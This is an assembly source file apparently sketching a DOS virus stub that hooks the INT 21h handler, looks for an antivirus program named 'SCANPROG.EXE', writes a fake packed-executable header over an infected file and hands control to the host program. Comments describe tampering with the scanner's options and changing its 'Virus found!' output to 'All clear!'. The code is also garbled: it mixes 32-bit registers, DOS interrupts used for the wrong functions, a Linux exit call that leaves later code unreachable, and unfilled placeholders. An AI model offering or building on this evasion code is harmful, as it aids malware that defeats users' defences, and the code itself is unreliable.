section .model small
section .stack 100h

section .data
    anti_virus_name db 'SCANPROG.EXE', 0
    fake_packed_header db 'MZ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
    int21_vector dd 0
    int21_old_handler dd 0
    message db 'Program executed successfully!', 0ah, 0dh, 0

section .code
bits 32
_start:
    ; Save the original INT 21h handler
    mov eax, 35h
    mov ebx, 21h
    int 21h
    mov [int21_old_handler], ebx
    mov [int21_old_handler+4], es

    ; Check if anti-virus program is running
    mov eax, 3Bh
    lea edx, [anti_virus_name]
    int 21h
    jnc anti_virus_found

    ; Modify command-line parameters for anti-virus program
    ; (e.g. change scan options to skip certain files)
    ; ...

    ; Alter the output of the anti-virus program
    ; (e.g. change 'Virus found!' to 'All clear!')
    ; ...

    ; Make the infected file look like a packed executable
    mov eax, 40h
    mov ecx, 16
    lea edx, [fake_packed_header]
    int 21h

    ; Jump to original program entry point
    jmp original_entry

anti_virus_found:
    ; Disable or unload the anti-virus program
    ; (e.g. patch the INT 21h handler to bypass the anti-virus checks)
    mov eax, 25h
    mov ebx, 21h
    lea edx, [int21_handler]
    int 21h
    jmp original_entry

int21_handler:
    ; Custom INT 21h handler that bypasses anti-virus checks
    cmp eax, 3Bh  ; Check if it's a 'EXEC' call
    je original_int21
    cmp eax, 4Bh  ; Check if it's a 'LOAD' call
    je original_int21
    ; Add more checks as needed to bypass anti-virus routines
    jmp short original_int21

original_int21:
    ; Call the original INT 21h handler
    push ds
    push es
    push eax
    ; ... (original INT 21h handler code)
    pop eax
    pop es
    pop ds
    jmp short int21_handler_end

int21_handler_end:
    ; Restore the original INT 21h handler
    mov eax, 25h
    mov ebx, 21h
    mov edx, [int21_old_handler]
    mov ds, [int21_old_handler+4]
    int 21h
    jmp short original_entry

original_entry:
    ; Add the original program entry point code here
    ; Example code:
    mov eax, 1
    mov ebx, 0
    int 80h  ; Linux system call to exit the program

    ; Display a message after the original program has executed
    mov eax, 9
    lea edx, [message]
    int 21h

    ; Exit the program
    mov eax, 4Ch
    xor ebx, ebx
    int 21h

